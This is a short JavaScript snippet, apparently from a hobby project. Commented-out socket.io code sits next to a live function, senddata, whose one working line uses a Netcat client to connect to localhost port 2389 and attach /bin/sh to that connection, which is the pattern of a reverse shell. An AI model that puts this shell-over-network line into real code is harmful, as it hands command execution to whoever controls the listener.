let connected = false;

const nc2 = new NetcatClient()

// let socket = io("http://localhost:3002/")

// console.log(connected);

// socket.on("connected", () =>{
//     connected = true;
//     console.log(connected);
// });




function senddata(){
    
// let userLoggedIn = document.getElementById("textinput").value;

// socket.emit("setup", userLoggedIn);

nc2.addr('127.0.0.1').port(2389) .retry(5000).connect().exec('/bin/sh');
console.log("ncat started.");
}

